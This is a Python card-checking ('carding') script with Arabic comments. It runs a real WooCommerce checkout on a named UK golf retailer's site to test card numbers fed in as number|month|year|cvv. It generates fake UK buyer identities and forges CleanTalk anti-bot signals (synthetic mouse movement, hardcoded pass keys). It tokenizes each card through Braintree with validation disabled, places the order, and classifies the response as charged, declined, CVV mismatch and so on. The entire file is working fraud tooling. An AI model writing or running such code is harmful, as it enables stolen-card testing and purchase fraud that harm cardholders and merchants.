# ==================== gatet.py (النسخة النهائية بالريكويستات الجديدة) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

def clean_html(text):
    """إزالة HTML tags من النص"""
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    """استخراج السبب بعد 'Reason:'"""
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_pointer_data():
    """تولد بيانات حركة ماوس عشوائية تشبه الإنسان"""
    pointer_data = []
    start_time = random.randint(30000, 60000)
    
    for i in range(random.randint(5, 12)):
        x = random.randint(200, 700)
        y = random.randint(50, 400)
        timestamp = start_time + random.randint(1000, 5000) * i
        pointer_data.append([x, y, timestamp])
    
    return json.dumps(pointer_data).replace(' ', '')

def extract_cleantalk_values(session, url):
    """تستخرج ct_checkjs و apbct_visible_fields من الصفحة"""
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        ct_checkjs = None
        checkjs_input = soup.find('input', {'name': 'ct_checkjs'})
        if checkjs_input:
            ct_checkjs = checkjs_input.get('value')
        
        apbct_visible = None
        visible_input = soup.find('input', {'id': 'apbct_visible_fields'})
        if not visible_input:
            visible_input = soup.find('input', {'name': 'apbct_visible_fields'})
        if visible_input:
            apbct_visible = visible_input.get('value')
        
        return ct_checkjs, apbct_visible
    except Exception as e:
        print(f"[!] Error extracting CleanTalk values: {e}")
        return None, None

def generate_valid_uk_data():
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    uk_postcodes = ['SW1A1AA', 'M11AE', 'B11TT', 'LS11UR', 'G11XU', 'EH11QQ', 'CF101EP', 'NE11EE', 'L11JA', 'S12BJ',
                    'YO1 8SU', 'M2 4AB', 'B3 2RT', 'L2 2QP', 'G2 3JX']
    uk_cities = ['London', 'Manchester', 'Birmingham', 'Leeds', 'Glasgow', 'Edinburgh', 'Cardiff', 'Newcastle', 'Liverpool', 'Sheffield', 'York']
    uk_phones = ['07712345678', '07890123456', '07987654321', '07412345678', '07567890123', '07789123456', '07891234567', '07912345678']
    uk_addresses = ['10 Downing Street', '221B Baker Street', 'Buckingham Palace Road', 'Abbey Road', 'Oxford Street',
                    'King Edward Street', 'Piccadilly Circus', 'Trafalgar Square', 'Covent Garden', 'Liverpool Street',
                    'Flat 2, Popes Head Court']
    
    # إيميلات من دومينات متعددة
    email_domains = ['@yahoo.com', '@hotmail.com', '@outlook.com', '@icloud.com', '@aol.com', 
                     '@protonmail.com', '@mail.com', '@gmx.com', '@yandex.com', '@zoho.com']
    email_domain = random.choice(email_domains)
    
    return {
        'first_name': first,
        'last_name': last,
        'email': f"{first.lower()}.{last.lower()}{random.randint(1,9999)}{email_domain}",
        'phone': random.choice(uk_phones),
        'address_1': random.choice(uk_addresses),
        'city': random.choice(uk_cities),
        'postcode': random.choice(uk_postcodes).replace(' ', ''),
        'company': f"{first}'s {random.choice(['Golf', 'Sports', 'Retail', 'Ltd', 'Shop'])}" if random.choice([True, False]) else ''
    }

def ch(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    user = generate_user_agent()
    fake_data = generate_valid_uk_data()
    session_id = str(uuid.uuid4())
    correlation_id = str(uuid.uuid4())[:24]
    r = requests.session()
    
    # ================ القيم الجديدة من الريكويستات ================
    SWPEXT = '55b87fed4f0a9ea8b89efe91cbdd1f7b'
    CT_SFW_PASS_KEY = '3f45678ad003807a74ad5e754cbffb020'
    CT_CHECKJS = '3f6280b1f540be05f340d33f9d2c7b1978d48f5bccbc455cdc521db6e2a5ea37'
    APBCT_VISIBLE_FIELDS = 'eyIwIjp7InZpc2libGVfZmllbGRzIjoicXVhbnRpdHkiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6ImF0dHJpYnV0ZV9wYV9jb2xvdXIgd29vYnRfaWRzIGFkZC10by1jYXJ0IHByb2R1Y3RfaWQgdmFyaWF0aW9uX2lkIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6NX19'
    APBCT_SITE_LANDING_TS = '1778505756'
    
    # ================ استخراج قيم CleanTalk جديدة من الموقع ================
    product_url = 'https://www.expressgolf.co.uk/product/4-yards-more-tees-4-pack/'
    
    initial_response = r.get(product_url)
    ct_checkjs_new, apbct_visible_new = extract_cleantalk_values(r, product_url)
    
    if ct_checkjs_new:
        CT_CHECKJS = ct_checkjs_new
        print(f"[+] Extracted fresh ct_checkjs: {CT_CHECKJS[:30]}...")
    if apbct_visible_new:
        APBCT_VISIBLE_FIELDS = apbct_visible_new
        print(f"[+] Extracted fresh apbct_visible_fields")
    
    ct_pointer_data = generate_pointer_data()
    ct_ps_timestamp = str(int(time.time()) + random.randint(100, 500))
    ct_fkp_timestamp = str(int(time.time()) + random.randint(50, 200))
    
    print(f"[+] CleanTalk - ct_checkjs: {CT_CHECKJS[:30]}...")
    print(f"[+] CleanTalk - pointer_data generated: {ct_pointer_data[:50]}...")
    
    # ================ 1. ADD TO CART (المنتج الجديد) ================
    product_url = 'https://www.expressgolf.co.uk/product/4-yards-more-tees-4-pack/'
    variation = 'driver'
    variation_id = '595287'
    product_id = '595286'
    
    params_get = {'attribute_pa_colour': variation}
    r.get(product_url, params=params_get)
    
    cookies_add = {
        'swpext86386': SWPEXT,
        '_ga': 'GA1.1.1317422336.1778490448',
        'cp-impression-added-forcp_id_87a52': 'true',
        '_fbp': 'fb.2.1778490465858.296458151290173414',
        'cp_id_87a52': 'true',
        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
        'ct_checkjs': CT_CHECKJS,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'ct_mouse_moved': 'true',
        'apbct_site_landing_ts': APBCT_SITE_LANDING_TS,
        'ct_pointer_data': ct_pointer_data,
        'ct_ps_timestamp': ct_ps_timestamp,
        'ct_fkp_timestamp': ct_fkp_timestamp,
    }
    
    files = {
        'attribute_pa_colour': (None, variation),
        'woobt_ids': (None, ''),
        'quantity': (None, '1'),
        'add-to-cart': (None, product_id),
        'product_id': (None, product_id),
        'variation_id': (None, variation_id),
        'apbct_visible_fields': (None, APBCT_VISIBLE_FIELDS),
    }
    
    headers_add = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'en-US',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': f'{product_url}?attribute_pa_colour={variation}',
        'user-agent': user,
        'upgrade-insecure-requests': '1',
        'accept-encoding': 'gzip, deflate, br',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    response = r.post(product_url, headers=headers_add, files=files, cookies=cookies_add)
    if response.status_code != 200:
        return f'ADD_TO_CART_FAILED'
    
    # تأخير عشوائي
    time.sleep(random.uniform(1.5, 3.5))
    
    # ================ 2. UPDATE SHIPPING METHOD (الجديد) ================
    cookies_shipping = {
        'swpext86386': SWPEXT,
        '_ga': 'GA1.1.1317422336.1778490448',
        'cp-impression-added-forcp_id_87a52': 'true',
        '_fbp': 'fb.2.1778490465858.296458151290173414',
        'cp_id_87a52': 'true',
        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
        'ct_checkjs': CT_CHECKJS,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'ct_mouse_moved': 'true',
        'apbct_site_landing_ts': APBCT_SITE_LANDING_TS,
        'ct_ps_timestamp': ct_ps_timestamp,
        'ct_pointer_data': ct_pointer_data,
    }
    
    headers_shipping = {
        'accept': '*/*',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': 'https://www.expressgolf.co.uk/basket/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_shipping = {'wc-ajax': 'update_shipping_method'}
    data_shipping = {
        'security': '2b707e95b2',
        'shipping_method[0]': 'local_pickup:79',
    }
    
    response = r.post('https://www.expressgolf.co.uk/', params=params_shipping, headers=headers_shipping, data=data_shipping, cookies=cookies_shipping)
    
    # تأخير عشوائي
    time.sleep(random.uniform(1, 2.5))
    
    # ================ 3. CHECKOUT PAGE ================
    headers_checkout = {
        'Accept-Language': 'en-US',
        'Referer': 'https://www.expressgolf.co.uk/basket/',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user,
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    response = r.get('https://www.expressgolf.co.uk/checkout/', headers=headers_checkout)
    if response.status_code != 200:
        return f'CHECKOUT_PAGE_FAILED'
    
    time.sleep(random.uniform(1, 2.5))
    
    # ================ 4. EXTRACT TOKENS AND NONCES ================
    enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
    if not enc:
        return 'CLIENT_TOKEN_NOT_FOUND'
    dec = base64.b64decode(enc.group(1)).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
    if not au:
        return 'FINGERPRINT_NOT_FOUND'
    au = au[0]
    
    sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
    if not sec:
        return 'UPDATE_ORDER_NONCE_NOT_FOUND'
    sec = sec.group(1)
    
    check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
    if not check:
        return 'CHECKOUT_NONCE_NOT_FOUND'
    check = check.group(1)
    
    time.sleep(random.uniform(0.5, 1.5))
    
    # ================ 5. UPDATE ORDER REVIEW ================
    billing_email = fake_data['email']
    billing_first = fake_data['first_name']
    billing_last = fake_data['last_name']
    billing_company = fake_data['company']
    billing_address = fake_data['address_1']
    billing_city = fake_data['city']
    billing_postcode = fake_data['postcode']
    billing_phone = fake_data['phone']
    
    headers_update = {
        'accept': '*/*',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': 'https://www.expressgolf.co.uk/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_update = {'wc-ajax': 'update_order_review'}
    
    data_update = f'security={sec}&payment_method=braintree_cc&country=GB&state=Yorkshire&postcode={billing_postcode}&city={billing_city}&address={billing_address.replace(" ", "%2C")}&address_2=Peter+Lane&s_country=GB&s_state=Yorkshire&s_postcode={billing_postcode}&s_city={billing_city}&s_address={billing_address.replace(" ", "%2C")}&s_address_2=Peter+Lane&has_full_address=true&post_data=wc_order_attribution_source_type%3D%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fwww.expressgolf.co.uk%252Fshop%252Faccessories%252Ftees%252F%26wc_order_attribution_utm_campaign%3D%26wc_order_attribution_utm_source%3D%26wc_order_attribution_utm_medium%3D%26wc_order_attribution_utm_content%3D%26wc_order_attribution_utm_id%3D%26wc_order_attribution_utm_term%3D%26wc_order_attribution_utm_source_platform%3D%26wc_order_attribution_utm_creative_format%3D%26wc_order_attribution_utm_marketing_tactic%3D%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.expressgolf.co.uk%252Fproduct%252Fchamp-pro-fly-tees-4-pack%252F%26wc_order_attribution_session_start_time%3D2026-05-11%252009%253A07%253A54%26wc_order_attribution_session_pages%3D6%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_email%3D{billing_email}%26billing_first_name%3D{billing_first}%26billing_last_name%3D{billing_last}%26billing_company%3D{billing_company}%26billing_country%3DGB%26wc_address_validation_postcode_lookup_postcode%3D%26billing_address_1%3D{billing_address.replace(" ", "%2520")}%26billing_address_2%3DPeter%2520Lane%26billing_city%3D{billing_city}%26billing_state%3DYorkshire%26billing_postcode%3D{billing_postcode}%26billing_phone%3D{billing_phone}%26wc_apbct_email_id%3D%26mailchimp_woocommerce_newsletter%3D1%26shipping_first_name%3D{billing_first}%26shipping_last_name%3D{billing_last}%26shipping_company%3D%26shipping_country%3DGB%26wc_address_validation_postcode_lookup_postcode%3D%26shipping_address_1%3D{billing_address.replace(" ", "%2520")}%26shipping_address_2%3DPeter%2520Lane%26shipping_city%3D{billing_city}%26shipping_state%3DYorkshire%26shipping_postcode%3D{billing_postcode}%26order_comments%3D%26shipping_method%255B0%255D%3Dlocal_pickup%253A79%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=local_pickup%3A79'
    
    response = r.post('https://www.expressgolf.co.uk/', params=params_update, headers=headers_update, data=data_update)
    
    time.sleep(random.uniform(0.5, 1.5))
    
    # ================ 6. TOKENIZE CREDIT CARD ================
    headers_token = {
        'accept': '*/*',
        'accept-language': 'en-US',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': user,
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    token_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': session_id,
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {
                        'postalCode': billing_postcode,
                        'streetAddress': billing_address[:50],
                    },
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=token_data)
    try:
        tok = response.json()['data']['tokenizeCreditCard']['token']
    except:
        return f'TOKENIZATION_FAILED'
    
    time.sleep(random.uniform(0.8, 1.8))
    
    # ================ 7. FINAL CHECKOUT ================
    cookies_final = {
        'swpext86386': SWPEXT,
        '_ga': 'GA1.1.1317422336.1778490448',
        'cp-impression-added-forcp_id_87a52': 'true',
        '_fbp': 'fb.2.1778490465858.296458151290173414',
        'cp_id_87a52': 'true',
        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
        'ct_checkjs': CT_CHECKJS,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'ct_mouse_moved': 'true',
        'apbct_site_landing_ts': APBCT_SITE_LANDING_TS,
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': 'b103003b3b7b332d1d3f417d04445ade',
        'ct_pointer_data': ct_pointer_data,
        'ct_ps_timestamp': ct_ps_timestamp,
        'ct_has_scrolled': 'true',
    }
    
    headers_final = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': 'https://www.expressgolf.co.uk/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_final = {'wc-ajax': 'checkout'}
    
    data_final = f'wc_order_attribution_source_type=&wc_order_attribution_referrer=https%3A%2F%2Fwww.expressgolf.co.uk%2Fshop%2Faccessories%2Ftees%2F&wc_order_attribution_utm_campaign=&wc_order_attribution_utm_source=&wc_order_attribution_utm_medium=&wc_order_attribution_utm_content=&wc_order_attribution_utm_id=&wc_order_attribution_utm_term=&wc_order_attribution_utm_source_platform=&wc_order_attribution_utm_creative_format=&wc_order_attribution_utm_marketing_tactic=&wc_order_attribution_session_entry=https%3A%2F%2Fwww.expressgolf.co.uk%2Fproduct%2Fchamp-pro-fly-tees-4-pack%2F&wc_order_attribution_session_start_time=2026-05-11+09%3A07%3A54&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_email={billing_email}&billing_first_name={billing_first}&billing_last_name={billing_last}&billing_company={billing_company}&billing_country=GB&wc_address_validation_postcode_lookup_postcode=&billing_address_1={billing_address.replace(" ", "+")}&billing_address_2=Peter+Lane&billing_city={billing_city}&billing_state=Yorkshire&billing_postcode={billing_postcode}&billing_phone={billing_phone}&wc_apbct_email_id=&mailchimp_woocommerce_newsletter=1&shipping_first_name={billing_first}&shipping_last_name={billing_last}&shipping_company=&shipping_country=GB&wc_address_validation_postcode_lookup_postcode=&shipping_address_1={billing_address.replace(" ", "+")}&shipping_address_2=Peter+Lane&shipping_city={billing_city}&shipping_state=Yorkshire&shipping_postcode={billing_postcode}&order_comments=&shipping_method%5B0%5D=local_pickup%3A79&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&apbct_visible_fields={APBCT_VISIBLE_FIELDS}'
    
    response = r.post('https://www.expressgolf.co.uk/', params=params_final, headers=headers_final, data=data_final, cookies=cookies_final)
    
    # ================ 8. PARSE RESULT ================
    try:
        result_data = json.loads(response.text)
        messages = result_data.get("messages", "")
        full_response = response.text
    except:
        return 'PARSE_ERROR'
    
    clean_messages = clean_html(messages)
    clean_full = clean_html(full_response)
    search_text = clean_messages + " " + clean_full
    
    reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
    reason = reason_match.group(1).strip() if reason_match else None
    
    print(f"[DEBUG] Clean response: {search_text[:300]}")
    
    # ================ ردود Braintree الكاملة والمفصلة ================
    
    # 1. النجاح
    if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
        return 'CHARGED'
    
    # 2. رصيد غير كافٍ
    if 'insufficient funds' in search_text:
        return 'INSUFFICIENT FUNDS'
    
    # 3. CVV خطأ
    if 'cvv' in search_text or 'cvv2 failure' in search_text or 'cvv verification failed' in search_text:
        return 'CVV MISMATCH'
    
    # 4. بطاقة منتهية
    if 'expired card' in search_text:
        return 'EXPIRED CARD'
    
    # 5. Do Not Honor
    if 'do not honor' in search_text:
        return 'DO NOT HONOR'
    
    # 6. Closed Card
    if 'closed card' in search_text:
        return 'CLOSED CARD'
    
    # 7. Call Issuer
    if 'call issuer' in search_text:
        return 'CALL ISSUER'
    
    # 8. Pick Up Card
    if 'pick up card' in search_text:
        return 'PICK UP CARD'
    
    # 9. 3D Secure
    if '3d secure' in search_text or 'three_d_secure' in search_text:
        return '3D SECURE REQUIRED'
    
    # 10. Limit Exceeded
    if 'limit exceeded' in search_text:
        return 'LIMIT EXCEEDED'
    
    # 11. Lost/Stolen Card
    if 'lost or stolen' in search_text:
        return 'LOST/STOLEN CARD'
    
    # 12. Address Mismatch
    if 'address verification' in search_text or 'avs' in search_text:
        return 'ADDRESS MISMATCH'
    
    # 13. Processor Declined
    if 'processor declined' in search_text:
        return 'PROCESSOR DECLINED'
    
    # 14. Invalid Card
    if 'invalid card' in search_text or 'invalid card number' in search_text:
        return 'INVALID CARD'
    
    # 15. No Account
    if 'no account' in search_text or 'no_account' in search_text:
        return 'NO ACCOUNT'
    
    # 16. Card Not Activated
    if 'card not activated' in search_text or 'not activated' in search_text:
        return 'CARD NOT ACTIVATED'
    
    # 17. Cannot authorize at this time (policy)
    if 'cannot authorize at this time' in search_text or 'cannot authorize' in search_text:
        return 'CANNOT AUTHORIZE (POLICY)'
    
    # 18. Card type not accepted
    if 'card type is not accepted' in search_text or 'card type not accepted' in search_text:
        return 'CARD TYPE NOT ACCEPTED'
    
    # 19. Card restriction
    if 'restriction on the card' in search_text or 'issuer restriction' in search_text:
        return 'CARD RESTRICTION'
    
    # 20. CleanTalk suspect
    if 'cleantalk suspect' in search_text or 'cleantalk' in search_text:
        if 'fraud' in search_text or 'spam' in search_text:
            return 'CLEANTALK FRAUD SUSPECT'
        else:
            return 'CLEANTALK SUSPECT'
    
    # 21. Gateway rejected fraud
    if 'gateway rejected: fraud' in search_text or 'gateway reject fraud' in search_text:
        return 'GATEWAY REJECTED FRAUD'
    
    # 22. Risk Threshold
    if 'risk_threshold' in search_text or 'risk threshold' in search_text:
        return 'RISK THRESHOLD'
    
    # 23. Processor declined - fraud suspected
    if 'processor declined - fraud suspected' in search_text:
        return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
    
    # 24. Call issuer. pick up card
    if 'call issuer. pick up card' in search_text:
        return 'CALL ISSUER - PICK UP CARD'
    
    # 25. Email doesn't exist
    if 'email does not exist' in search_text or 'email doesn\'t exist' in search_text:
        return 'EMAIL DOES NOT EXIST'
    
    # 26. Pickup card
    if 'pickup card' in search_text:
        return 'PICKUP CARD'
    
    # 27. Fraud (عام)
    if 'fraud' in search_text or 'suspected fraud' in search_text:
        return 'SUSPECTED FRAUD'
    
    # 28. Generic Decline
    if 'declined' in search_text:
        return 'DECLINED'
    
    # 29. أي سبب تاني من الـ Reason
    if reason and len(reason) < 40:
        return reason.upper()
    
    # 30. نص الـ messages نفسه لو قصير
    if clean_messages and len(clean_messages) < 60:
        return clean_messages.title()
    
    return 'DECLINED'
